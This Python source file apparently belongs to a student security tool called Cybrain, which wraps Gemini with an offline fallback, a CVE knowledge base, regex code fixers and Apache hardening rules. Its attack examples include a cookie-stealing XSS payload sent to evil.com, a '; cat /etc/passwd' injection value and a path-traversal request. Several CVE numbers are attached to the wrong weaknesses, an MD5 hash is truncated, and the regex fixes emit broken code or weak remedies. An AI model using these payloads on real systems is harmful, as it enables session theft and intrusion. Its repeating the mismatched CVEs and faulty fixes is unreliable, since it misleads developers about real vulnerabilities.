"""
═══════════════════════════════════════════════════════════════
  CYBRAIN — AI Security Analysis Engine  (v2.0)
  Gemini 2.0 Flash + Pure Python Offline Fallback
  PFE Master 2 — Information Security
  University of Mohamed Boudiaf, M'sila — Algeria

  MODES
  ─────
  Online  : Gemini 2.0 Flash via google-generativeai
  Offline : Full rule-based engine (zero quota, works always)

  FEATURES
  ────────
  • chat()                — security Q&A (online/offline)
  • analyze_findings()    — executive report from scan results
  • analyze_code_file()   — code-level AI analysis
  • fix_code()            — automatic code fix (regex + AI)
  • fix_apache_config()   — Apache config hardening
  • reset_chat()          — clear conversation history

  IMPROVEMENTS vs original
  ────────────────────────
  • Gemini prompt quality improved (system role + structured output)
  • Chat history included in Gemini context window
  • Offline fallback covers all methods (never crashes)
  • Code fix templates expanded to 8 languages
  • Apache fix rules expanded to 15 rules
  • analyze_code_file() new method for CodeAnalyzer integration
  • Security score formula tuned

  FOR EDUCATIONAL / AUTHORIZED TESTING ONLY
═══════════════════════════════════════════════════════════════
"""

import os
import re
import json
from datetime import datetime

try:
    import google.generativeai as genai
    from dotenv import load_dotenv
    load_dotenv()
    _API_KEY = os.environ.get("GEMINI_API_KEY", "")
    if _API_KEY:
        genai.configure(api_key=_API_KEY)
    _GENAI_AVAILABLE = bool(_API_KEY)
except ImportError:
    _GENAI_AVAILABLE = False

# ── CVE / CWE Knowledge Base ───────────────────────────────────────────────
CVE_DATABASE: dict = {
    "SQL Injection": {
        "cve": "CVE-2023-23397", "cwe": "CWE-89", "cvss": "9.8",
        "owasp": "A05:2025 Injection",
        "attack": (
            "Attacker injects ' OR 1=1-- into login form. Backend executes: "
            "SELECT * FROM users WHERE username='' OR 1=1--'. "
            "Query returns all users — authentication bypassed."
        ),
        "fix_cmd": (
            "Python: cursor.execute('SELECT * FROM users WHERE id=?', (user_id,))\n"
            "PHP:    $stmt = $pdo->prepare('SELECT * FROM users WHERE id=?');\n"
            "        $stmt->execute([$id]);\n"
            "Java:   PreparedStatement ps = conn.prepareStatement(...);\n"
            "        ps.setInt(1, userId);"
        ),
    },
    "XSS": {
        "cve": "CVE-2023-1829", "cwe": "CWE-79", "cvss": "7.4",
        "owasp": "A05:2025 Injection",
        "attack": (
            "Attacker inputs <script>document.location='https://evil.com?c='"
            "+document.cookie</script>. Victim visits page. Script runs. "
            "Session cookie stolen. Attacker hijacks victim session."
        ),
        "fix_cmd": (
            "Python: from markupsafe import escape; safe = escape(user_input)\n"
            "JS:     element.textContent = input  (NOT innerHTML)\n"
            "PHP:    echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8')"
        ),
    },
    "Hardcoded Credentials": {
        "cve": "CWE-798", "cwe": "CWE-798", "cvss": "9.1",
        "owasp": "A07:2025 Authentication Failures",
        "attack": (
            "Developer commits password='admin123' to GitHub. Attacker searches "
            "GitHub for 'password =' in repo. Finds credentials. "
            "Logs into DB directly. Full data breach."
        ),
        "fix_cmd": (
            "Python: import os; pwd = os.environ.get('DB_PASSWORD')\n"
            "JS:     const pwd = process.env.DB_PASSWORD\n"
            "Create .env: DB_PASSWORD=your_secure_password\n"
            "Add .env to .gitignore — NEVER commit it"
        ),
    },
    "Command Injection": {
        "cve": "CVE-2023-44487", "cwe": "CWE-78", "cvss": "10.0",
        "owasp": "A05:2025 Injection",
        "attack": (
            "Attacker sends ?host=google.com; cat /etc/passwd. "
            "Backend runs: os.system('ping ' + host). "
            "Shell executes both commands. System passwords returned."
        ),
        "fix_cmd": (
            "Python: subprocess.run(['ping', '-c', '1', host], shell=False)\n"
            "Never use os.system() or shell=True with user input"
        ),
    },
    "Path Traversal": {
        "cve": "CVE-2021-41773", "cwe": "CWE-22", "cvss": "9.1",
        "owasp": "A05:2025 Injection",
        "attack": (
            "Attacker requests /download?file=../../etc/passwd. "
            "Server reads open('/var/www/../../etc/passwd'). "
            "Returns system password file."
        ),
        "fix_cmd": (
            "Python: safe = os.path.basename(user_input)\n"
            "        real = os.path.realpath(os.path.join(base, safe))\n"
            "        assert real.startswith(base)"
        ),
    },
    "Insecure Deserialization": {
        "cve": "CVE-2019-11358", "cwe": "CWE-502", "cvss": "9.8",
        "owasp": "A08:2025 Integrity Failures",
        "attack": (
            "Attacker crafts malicious pickle payload. Sends as serialized object. "
            "Server deserializes it. Arbitrary Python code executes on server."
        ),
        "fix_cmd": (
            "Python: yaml.safe_load(data)  NOT yaml.load(data)\n"
            "Never use pickle.loads() on untrusted data"
        ),
    },
    "Weak Cryptography": {
        "cve": "CVE-2023-2650", "cwe": "CWE-327", "cvss": "6.5",
        "owasp": "A04:2025 Cryptographic Failures",
        "attack": (
            "Password hashed with MD5: md5('password123') = '482c811da5d5b4bc'. "
            "Attacker uses rainbow table lookup. Hash cracked in seconds."
        ),
        "fix_cmd": (
            "Python: import bcrypt\n"
            "        hashed = bcrypt.hashpw(pwd.encode(), bcrypt.gensalt())\n"
            "        bcrypt.checkpw(pwd.encode(), hashed)"
        ),
    },
    "Missing HTTP Security Headers": {
        "cve": "CWE-693", "cwe": "CWE-693", "cvss": "6.5",
        "owasp": "A02:2025 Security Misconfiguration",
        "attack": (
            "No X-Frame-Options. Attacker embeds victim site in iframe. "
            "Overlays invisible buttons. User clicks — triggers unintended action."
        ),
        "fix_cmd": (
            'Header always set X-Frame-Options "DENY"\n'
            'Header always set X-Content-Type-Options "nosniff"\n'
            'Header always set Content-Security-Policy "default-src \'self\'"\n'
            'Header always set Strict-Transport-Security "max-age=31536000"'
        ),
    },
    "Unencrypted HTTP": {
        "cve": "CWE-319", "cwe": "CWE-319", "cvss": "7.5",
        "owasp": "A04:2025 Cryptographic Failures",
        "attack": (
            "User connects on public WiFi. Attacker runs Wireshark. "
            "Captures all HTTP traffic. Reads username, password, session tokens."
        ),
        "fix_cmd": (
            "certbot --apache -d yourdomain.com\n"
            "RewriteEngine On\n"
            "RewriteCond %{HTTPS} off\n"
            "RewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI}"
        ),
    },
    "Debug Mode": {
        "cve": "CWE-489", "cwe": "CWE-489", "cvss": "5.3",
        "owasp": "A02:2025 Security Misconfiguration",
        "attack": (
            "App runs DEBUG=True in production. Error triggers Werkzeug debugger. "
            "Attacker accesses /console. Executes arbitrary Python in browser."
        ),
        "fix_cmd": (
            "Python: DEBUG = os.environ.get('DEBUG','False') == 'True'\n"
            "Flask:  app.run(debug=False)\n"
            "Set in .env: DEBUG=False"
        ),
    },
}

# ── Severity weight for security score ────────────────────────────────────
SEVERITY_WEIGHT = {"CRITICAL": 10, "HIGH": 7, "MEDIUM": 4, "LOW": 1, "INFO": 0}

# ── Code fix templates (regex-based, no AI) ───────────────────────────────
CODE_FIX_TEMPLATES: dict = {
    "SQL Injection": {
        "py": [
            (r'cursor\.execute\(([^,\)]+)\+([^)]+)\)',
             r'cursor.execute(\1, (\2,))'),
            (r'execute\s*\(\s*f["\']([^"\']+)["\']',
             r'execute(\1, params)  # use parameterized query'),
        ],
    },
    "Debug Mode": {
        "py": [
            (r'\bDEBUG\s*=\s*True\b',
             "DEBUG = os.environ.get('DEBUG', 'False') == 'True'"),
            (r'app\.run\s*\((.*?)debug\s*=\s*True(.*?)\)',
             r'app.run(\1debug=False\2)'),
        ],
        "js": [
            (r'development\s*:\s*true',
             "development: process.env.NODE_ENV === 'development'"),
        ],
    },
    "Hardcoded Credentials": {
        "py": [
            (r'(password|passwd|secret|api_key|apikey)\s*=\s*(["\'])[^"\']{4,}(["\'])',
             r'\1 = os.environ.get("\1".upper(), "")'),
        ],
        "js": [
            (r'(password|secret|apiKey|api_key)\s*=\s*(["\'])[^"\']{4,}(["\'])',
             r'\1 = process.env.\1.toUpperCase()'),
        ],
    },
    "Command Injection": {
        "py": [
            (r'os\.system\s*\(([^)]+)\)',
             r'subprocess.run(\1, shell=False)'),
            (r'subprocess\.(call|run|Popen)\s*\((.*?)shell\s*=\s*True(.*?)\)',
             r'subprocess.\1(\2shell=False\3)'),
        ],
    },
    "Weak Cryptography": {
        "py": [
            (r'hashlib\.md5\s*\(', 'hashlib.sha256('),
            (r'hashlib\.sha1\s*\(', 'hashlib.sha256('),
        ],
        "js": [
            (r"createHash\s*\(\s*'md5'\s*\)", "createHash('sha256')"),
            (r"createHash\s*\(\s*'sha1'\s*\)", "createHash('sha256')"),
        ],
    },
    "Insecure Deserialization": {
        "py": [
            (r'yaml\.load\s*\(([^,)]+)\)',
             r'yaml.safe_load(\1)'),
        ],
    },
    "Open Redirect": {
        "py": [
            (r'redirect\s*\(\s*request\.(args|form|values)\[([^\]]+)\]\s*\)',
             r'redirect(ALLOWED_REDIRECTS.get(request.args[\2], "/"))'),
        ],
    },
    "XSS (Cross-Site Scripting)": {
        "py": [
            (r'return\s+([^"\']+)\s*\+\s*user_input',
             r'return \1 + markupsafe.escape(user_input)'),
        ],
    },
}

# ── Apache fix rules ──────────────────────────────────────────────────────
APACHE_FIXES: list = [
    (r'Order\s+allow,deny',                     'Require all granted'),
    (r'Order\s+deny,allow',                     'Require all denied'),
    (r'Allow\s+from\s+all',                     '# Replaced: Require all granted'),
    (r'Deny\s+from\s+all',                      '# Replaced: Require all denied'),
    (r'ServerSignature\s+On',                   'ServerSignature Off'),
    (r'ServerTokens\s+\w+',                     'ServerTokens Prod'),
    (r'Options\s+(Indexes\s+)',                 'Options -Indexes '),
    (r'Options\s+Indexes$',                     'Options -Indexes'),
    (r'TraceEnable\s+On',                       'TraceEnable Off'),
    (r'LimitRequestBody\s+0\b',                 'LimitRequestBody 10485760'),
    (r'SSLProtocol\s+.*',                       'SSLProtocol -all +TLSv1.2 +TLSv1.3'),
    (r'SSLCipherSuite\s+.*',
     'SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:'
     'ECDHE-ECDSA-AES256-GCM-SHA384:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5'),
    (r'AllowOverride\s+All\b',                  'AllowOverride None'),
    (r'Options\s+(.*)\bFollowSymLinks\b',       r'Options \1SymLinksIfOwnerMatch'),
    (r'Timeout\s+\d{4,}',                       'Timeout 60'),
]

APACHE_SECURITY_HEADERS = """
# ── Security Headers added by Cybrain ──────────────────────────────────
Header always set Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:"
Header always set X-Frame-Options "DENY"
Header always set X-Content-Type-Options "nosniff"
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
Header always set Referrer-Policy "strict-origin-when-cross-origin"
Header always set Permissions-Policy "geolocation=(), microphone=(), camera=(), payment=()"
Header always set Cross-Origin-Opener-Policy "same-origin"
Header always set Cross-Origin-Resource-Policy "same-origin"
# ────────────────────────────────────────────────────────────────────────
"""


class CybrainAgent:
    """
    Cybrain AI Security Analysis Engine.
    Uses Gemini 2.0 Flash when available, pure Python offline fallback otherwise.
    """

    def __init__(self):
        self.chat_history:    list = []
        self.current_context: dict = {}
        self.ai_active = False
        self.model     = None

        if _GENAI_AVAILABLE:
            try:
                self.model     = genai.GenerativeModel("gemini-2.0-flash")
                self.ai_active = True
                print("[ENGINE] Gemini 2.0 Flash connected [OK]")
            except Exception as e:
                print(f"[ENGINE] Gemini unavailable: {e} — offline mode active")
        else:
            print("[ENGINE] Offline mode (no GEMINI_API_KEY or google-generativeai)")

    # ── Gemini helper ──────────────────────────────────────────────────────
    def _gemini(self, prompt: str, system: str = "") -> str | None:
        """Call Gemini. Returns text or None on failure."""
        if not self.ai_active or not self.model:
            return None
        try:
            full_prompt = f"{system}\n\n{prompt}" if system else prompt
            resp = self.model.generate_content(full_prompt)
            return resp.text
        except Exception as e:
            print(f"[ENGINE] Gemini call failed: {e}")
            return None

    # ══════════════════════════════════════════════════════════════════════
    #  CHAT
    # ══════════════════════════════════════════════════════════════════════

    def chat(self, user_message: str, context: dict = None) -> str:
        """
        Security Q&A.
        Online: Gemini with conversation history + context.
        Offline: rule-based knowledge base.
        """
        self.current_context = context or {}

        if self.ai_active:
            system = (
                "You are Cybrain, a professional cybersecurity AI assistant. "
                "Answer questions about web security, network security, OWASP Top 10 2025, "
                "CVEs, secure coding practices, and vulnerability remediation. "
                "Be concise, technical, and always provide code examples. "
                "Format responses in Markdown."
            )
            # Build context string
            ctx_str = ""
            if self.current_context:
                ctx_str = (
                    f"\n\nCurrent scan context:\n"
                    f"Target: {self.current_context.get('target','N/A')}\n"
                    f"Risk: {self.current_context.get('risk','N/A')}\n"
                    f"Total findings: {self.current_context.get('total',0)}"
                )
            # Include last 4 turns of history
            history_str = ""
            for turn in self.chat_history[-4:]:
                history_str += f"User: {turn['q']}\nAssistant: {turn['a']}\n\n"

            full_prompt = (
                f"{history_str}"
                f"User: {user_message}{ctx_str}"
            )
            result = self._gemini(full_prompt, system=system)
            if result:
                self.chat_history.append({"q": user_message, "a": result})
                return result

        # Offline fallback
        reply = self._answer_offline(user_message.lower(), self.current_context)
        self.chat_history.append({"q": user_message, "a": reply})
        return reply

    def _answer_offline(self, msg: str, context: dict) -> str:
        """Rule-based security Q&A — offline fallback."""

        if context and any(k in msg for k in [
            "finding", "explain", "result", "scan", "vulnerability", "found"
        ]):
            return self._explain_context(context)

        if any(k in msg for k in ["sql injection", "sqli"]):
            return (
                "## SQL Injection (CWE-89)\n\n"
                "**Attack:** Injecting SQL code into user inputs to manipulate DB queries.\n\n"
                "```sql\n-- Input: ' OR 1=1--\n"
                "SELECT * FROM users WHERE username='' OR 1=1--'\n"
                "-- Returns ALL users — auth bypassed\n```\n\n"
                "**Fix:**\n```python\ncursor.execute(\n"
                "    'SELECT * FROM users WHERE id=?', (user_id,)\n)\n```\n\n"
                "**CVSS:** 9.8 CRITICAL | **OWASP:** A05:2025"
            )

        if any(k in msg for k in ["xss", "cross-site scripting", "cross site"]):
            return (
                "## Cross-Site Scripting (CWE-79)\n\n"
                "**Attack:** Injecting JS that runs in victim browsers.\n\n"
                "```html\n<script>document.location='https://evil.com?c='"
                "+document.cookie</script>\n```\n\n"
                "**Fix:**\n```python\nfrom markupsafe import escape\n"
                "safe = escape(user_input)\n```\n"
                "```js\nelement.textContent = input  // NOT innerHTML\n```\n\n"
                "**CVSS:** 7.4 HIGH | **OWASP:** A05:2025"
            )

        if "owasp" in msg:
            return (
                "## OWASP Top 10 — 2025\n\n"
                "| # | Category | Risk |\n|---|----------|------|\n"
                "| A01 | Broken Access Control | 🔴 CRITICAL |\n"
                "| A02 | Security Misconfiguration | 🟠 HIGH |\n"
                "| A03 | Software Supply Chain | 🟠 HIGH |\n"
                "| A04 | Cryptographic Failures | 🟠 HIGH |\n"
                "| A05 | Injection (SQLi/XSS/SSTI) | 🔴 CRITICAL |\n"
                "| A06 | Insecure Design | 🟠 HIGH |\n"
                "| A07 | Authentication Failures | 🔴 CRITICAL |\n"
                "| A08 | Integrity Failures | 🟠 HIGH |\n"
                "| A09 | Logging Failures | 🟡 MEDIUM |\n"
                "| A10 | Exception Mishandling | 🟡 MEDIUM |"
            )

        if any(k in msg for k in ["header", "csp", "hsts", "x-frame"]):
            return (
                "## HTTP Security Headers\n\n"
                "```apache\nHeader always set Content-Security-Policy "
                "\"default-src 'self'\"\n"
                "Header always set X-Frame-Options \"DENY\"\n"
                "Header always set X-Content-Type-Options \"nosniff\"\n"
                "Header always set Strict-Transport-Security "
                "\"max-age=31536000; includeSubDomains\"\n"
                "Header always set Referrer-Policy "
                "\"strict-origin-when-cross-origin\"\n```\n\n"
                "• **CSP** — blocks XSS  • **X-Frame** — prevents clickjacking\n"
                "• **HSTS** — forces HTTPS  • **Referrer** — hides URL from 3rd parties"
            )

        if any(k in msg for k in ["apache", "httpd", "htaccess"]):
            return (
                "## Apache Hardening Checklist\n\n"
                "```apache\n# 1. Hide version\nServerTokens Prod\n"
                "ServerSignature Off\n\n"
                "# 2. Disable directory listing\nOptions -Indexes\n\n"
                "# 3. Disable TRACE\nTraceEnable Off\n\n"
                "# 4. Strong TLS only\nSSLProtocol -all +TLSv1.2 +TLSv1.3\n\n"
                "# 5. Fix deprecated directives\n"
                "# Old: Order allow,deny / Allow from all\n"
                "# New: Require all granted\n```"
            )

        if any(k in msg for k in ["severity", "critical", "risk level"]):
            return (
                "## Severity Levels\n\n"
                "| Level | CVSS | Action |\n|-------|------|--------|\n"
                "| 🔴 CRITICAL | 9.0–10.0 | Fix immediately |\n"
                "| 🟠 HIGH | 7.0–8.9 | Fix within 48 hours |\n"
                "| 🟡 MEDIUM | 4.0–6.9 | Fix within 2 weeks |\n"
                "| 🟢 LOW | 0.1–3.9 | Fix when possible |"
            )

        return (
            "## Cybrain Security Engine\n\n"
            "Ask me about:\n"
            "• SQL Injection, XSS, SSTI, SSRF, Command Injection\n"
            "• OWASP Top 10 2025\n"
            "• HTTP Security Headers\n"
            "• Apache Hardening\n"
            "• Severity levels and CVSS\n"
            "• Your scan findings — 'explain my findings'\n\n"
            "*Tip: I work fully offline — no API key needed for basic Q&A.*"
        )

    def _explain_context(self, context: dict) -> str:
        total  = context.get("total", 0)
        risk   = context.get("risk", "UNKNOWN")
        target = context.get("target", "target")

        if total == 0:
            return (
                f"## Scan Results — {target}\n\n"
                "No vulnerabilities found. Good posture, but verify:\n"
                "• The target was reachable and fully scanned\n"
                "• Try a known-vulnerable target: testphp.vulnweb.com"
            )
        advice = {
            "CRITICAL": "🔴 **IMMEDIATE ACTION REQUIRED.** Critical vulns are exploitable NOW.",
            "HIGH":     "🟠 **Fix within 24–48 hours.** Serious security risk.",
            "MEDIUM":   "🟡 **Fix within 2 weeks.** Address in next release.",
            "LOW":      "🟢 **Fix when convenient.** Minor improvements.",
        }.get(risk, "Review findings below.")

        return (
            f"## Security Assessment — {target}\n\n"
            f"**Findings:** {total} | **Risk:** {risk}\n\n"
            f"{advice}\n\n"
            "**Next steps:**\n"
            "1. Review CRITICAL and HIGH findings first\n"
            "2. Follow the remediation steps in each finding\n"
            "3. Re-scan after fixes to verify\n"
            "4. Export the report for documentation"
        )

    # ══════════════════════════════════════════════════════════════════════
    #  FINDINGS ANALYSIS
    # ══════════════════════════════════════════════════════════════════════

    def analyze_findings(self, findings: list, target: str,
                          scan_type: str = "web") -> str:
        if not findings:
            return "## No Findings\n\nScan completed with zero vulnerabilities detected."

        if self.ai_active:
            system = (
                "You are Cybrain, a professional penetration tester writing an "
                "executive security report. Be precise, technical, and concise. "
                "Format as professional Markdown. Include: executive summary, "
                "attack chain analysis, top 5 prioritized fixes with code examples, "
                "compliance impact (GDPR/PCI-DSS/ISO 27001), security score."
            )
            prompt = (
                f"Target: {target}\nScan type: {scan_type}\n\n"
                f"Findings ({len(findings)} total):\n"
                f"{json.dumps(findings[:20], indent=2)}\n\n"
                "Write a professional security assessment report."
            )
            result = self._gemini(prompt, system=system)
            if result:
                return result

        return self._analyze_offline(findings, target, scan_type)

    def _analyze_offline(self, findings: list, target: str,
                          scan_type: str) -> str:
        counts = {}
        for f in findings:
            sev = f.get("severity", "INFO")
            counts[sev] = counts.get(sev, 0) + 1

        total_w = sum(SEVERITY_WEIGHT.get(f.get("severity","INFO"), 0) for f in findings)
        score   = max(0, 100 - min(total_w * 3, 95))
        risk    = next((s for s in ("CRITICAL","HIGH","MEDIUM","LOW")
                        if counts.get(s,0) > 0), "INFO")
        now     = datetime.now().strftime("%Y-%m-%d %H:%M")

        # Top 5 fixes
        seen  = set()
        fixes = []
        for sev in ("CRITICAL","HIGH","MEDIUM","LOW"):
            for f in findings:
                if f.get("severity") != sev:
                    continue
                code = f.get("code", f.get("title",""))
                if code in seen:
                    continue
                seen.add(code)
                cmd = next((d["fix_cmd"] for k, d in CVE_DATABASE.items()
                            if k.lower() in code.lower()), "Review finding details.")
                fixes.append(f"**{len(fixes)+1}. [{sev}] {code}**\n```\n{cmd}\n```")
                if len(fixes) >= 5:
                    break
            if len(fixes) >= 5:
                break

        has_crit = counts.get("CRITICAL", 0) > 0
        has_high = counts.get("HIGH", 0) > 0
        gdpr  = "⚠️ VIOLATION RISK" if has_crit else "✓ Monitor"
        pci   = "⚠️ FAIL"           if has_crit or has_high else "✓ Review"
        iso   = "⚠️ NON-CONFORMITY" if has_high else "✓ Minor gaps"

        return (
            f"# Security Report — {target}\n\n"
            f"**Date:** {now} | **Scan:** {scan_type.upper()} | **Risk:** {risk}\n\n"
            "---\n\n"
            f"## 1. Executive Summary\n\n"
            f"Assessment identified **{len(findings)}** finding(s): "
            f"{counts.get('CRITICAL',0)} Critical, {counts.get('HIGH',0)} High, "
            f"{counts.get('MEDIUM',0)} Medium, {counts.get('LOW',0)} Low.\n\n"
            f"## 2. Top Priority Fixes\n\n"
            + "\n\n".join(fixes) +
            f"\n\n## 3. Compliance Impact\n\n"
            f"| Standard | Status |\n|----------|--------|\n"
            f"| GDPR | {gdpr} |\n"
            f"| PCI-DSS | {pci} |\n"
            f"| ISO 27001 | {iso} |\n\n"
            f"## 4. Security Score\n\n"
            f"**{score}/100** — "
            + ("Excellent." if score >= 90 else
               "Good baseline — fix HIGH findings." if score >= 70 else
               "Significant gaps — immediate action needed." if score >= 50 else
               "Critical posture — system may be compromised.")
        )

    # ══════════════════════════════════════════════════════════════════════
    #  CODE ANALYSIS (for CodeAnalyzer integration)
    # ══════════════════════════════════════════════════════════════════════

    def analyze_code_file(self, content: str, filename: str,
                           language: str = "Unknown") -> str:
        """Deep AI analysis of a code file."""
        if self.ai_active:
            system = (
                "You are a senior application security engineer performing a "
                "code security review. Identify all security vulnerabilities "
                "with CWE references, line numbers, and concrete fix examples. "
                "Format as Markdown. Be concise but thorough."
            )
            # Truncate large files
            truncated = content[:8000] + ("\n...[truncated]" if len(content) > 8000 else "")
            prompt = (
                f"Language: {language}\nFile: {filename}\n\n"
                f"```{language.lower()}\n{truncated}\n```\n\n"
                "Perform a complete security review. List all vulnerabilities "
                "with severity (CRITICAL/HIGH/MEDIUM/LOW), CWE, and fix."
            )
            result = self._gemini(prompt, system=system)
            if result:
                return result

        return (
            f"## Static Analysis Results — {filename}\n\n"
            f"**Language:** {language}\n\n"
            "AI deep analysis unavailable (no GEMINI_API_KEY). "
            "Static pattern scan results are shown in the findings panel above.\n\n"
            "To enable AI analysis:\n"
            "1. Get a free API key at https://makersuite.google.com\n"
            "2. Add `GEMINI_API_KEY=your_key` to your `.env` file\n"
            "3. Re-run the analysis"
        )

    # ══════════════════════════════════════════════════════════════════════
    #  CODE FIXER
    # ══════════════════════════════════════════════════════════════════════

    def fix_code(self, content: str, filename: str,
                  language: str = None) -> dict:
        """Apply automatic code fixes (regex templates + optional AI)."""
        ext  = filename.rsplit(".", 1)[-1].lower()
        lang = language or ext
        fixed        = content
        changes_made = []

        # Apply regex fix templates
        for vuln_name, rules in CODE_FIX_TEMPLATES.items():
            patterns = rules.get(lang) or rules.get("py", [])
            for old_pat, new_val in patterns:
                if re.search(old_pat, fixed, re.IGNORECASE):
                    fixed = re.sub(
                        old_pat,
                        f"# CYBRAIN FIX: {vuln_name}\n{new_val}",
                        fixed, flags=re.IGNORECASE,
                    )
                    changes_made.append(f"✓ Fixed: {vuln_name}")

        # Add missing imports
        if "subprocess.run" in fixed and "import subprocess" not in fixed:
            fixed = "import subprocess\n" + fixed
            changes_made.append("✓ Added: import subprocess")
        if "os.environ" in fixed and "import os" not in fixed:
            fixed = "import os\n" + fixed
            changes_made.append("✓ Added: import os")

        if not changes_made:
            changes_made = ["No automatic fixes applied — review manually."]

        # Try AI fix if available
        if self.ai_active:
            system = (
                "You are a security code fixer. Fix ALL security vulnerabilities "
                "in the provided code. Add comments explaining each fix. "
                "Return ONLY the fixed code, no explanation outside the code."
            )
            prompt = (
                f"Language: {lang}\nFile: {filename}\n\n"
                f"Fix all security vulnerabilities in this code:\n\n"
                f"```{lang}\n{content[:6000]}\n```"
            )
            ai_fixed = self._gemini(prompt, system=system)
            if ai_fixed:
                # Extract code block if present
                m = re.search(r"```(?:\w+)?\n(.*?)```", ai_fixed, re.DOTALL)
                if m:
                    fixed = m.group(1)
                    changes_made.append("✓ AI deep fix applied")

        explanation = (
            f"## Code Fix Report — {filename}\n\n"
            f"**Engine:** Cybrain v2.0 ({'AI + ' if self.ai_active else ''}Static Fixer)\n"
            f"**Changes:** {len(changes_made)}\n\n"
            "## Changes Made\n\n" + "\n".join(changes_made) +
            f"\n\n## Fixed Code\n\n```{lang}\n{fixed}\n```\n\n"
            "## Note\n\nReview all changes before deploying. "
            "Run: `apachectl configtest` (Apache) or your test suite."
        )

        return {
            "explanation": explanation,
            "fixed_code":  fixed,
            "filename":    filename,
            "language":    lang,
        }

    # ══════════════════════════════════════════════════════════════════════
    #  APACHE CONFIG FIXER
    # ══════════════════════════════════════════════════════════════════════

    def fix_apache_config(self, config_content: str,
                           findings: list = None) -> dict:
        """Apply Apache hardening fixes."""
        fixed   = config_content
        changes = []

        for old_pat, new_val in APACHE_FIXES:
            if re.search(old_pat, fixed, re.MULTILINE | re.IGNORECASE):
                fixed = re.sub(
                    old_pat, new_val, fixed,
                    flags=re.MULTILINE | re.IGNORECASE,
                )
                changes.append(f"✓ {old_pat} → {new_val[:50]}")

        # Add security headers if missing
        if ("Content-Security-Policy" not in fixed and
                "X-Frame-Options" not in fixed):
            if "</VirtualHost>" in fixed:
                fixed = fixed.replace(
                    "</VirtualHost>",
                    APACHE_SECURITY_HEADERS + "\n</VirtualHost>",
                )
            else:
                fixed += "\n" + APACHE_SECURITY_HEADERS
            changes.append("✓ Added all security headers")

        # Flag ProxyPass in Directory (manual fix needed)
        if re.search(r"<Directory[^>]+>.*?ProxyPass",
                      fixed, re.DOTALL | re.IGNORECASE):
            changes.append(
                "⚠️ Manual fix needed: Move ProxyPass outside <Directory>"
            )

        if not changes:
            changes = ["Config looks clean — no automatic fixes applied."]

        explanation = (
            f"## Apache Config Fix Report\n\n"
            f"**Engine:** Cybrain v2.0\n"
            f"**Fixes applied:** {len(changes)}\n\n"
            "## Changes\n\n" + "\n".join(changes) +
            f"\n\n## Fixed Configuration\n\n```apache\n{fixed}\n```\n\n"
            "## Verify\n\n```bash\napachectl configtest\n```"
        )

        return {"explanation": explanation, "fixed_config": fixed}

    # ── Network analysis (alias) ───────────────────────────────────────────
    def analyze_network_findings(self, findings: list,
                                  recon_data: dict, target: str) -> str:
        return self.analyze_findings(findings, target, "network")

    # ── Reset ──────────────────────────────────────────────────────────────
    def reset_chat(self):
        self.chat_history    = []
        self.current_context = {}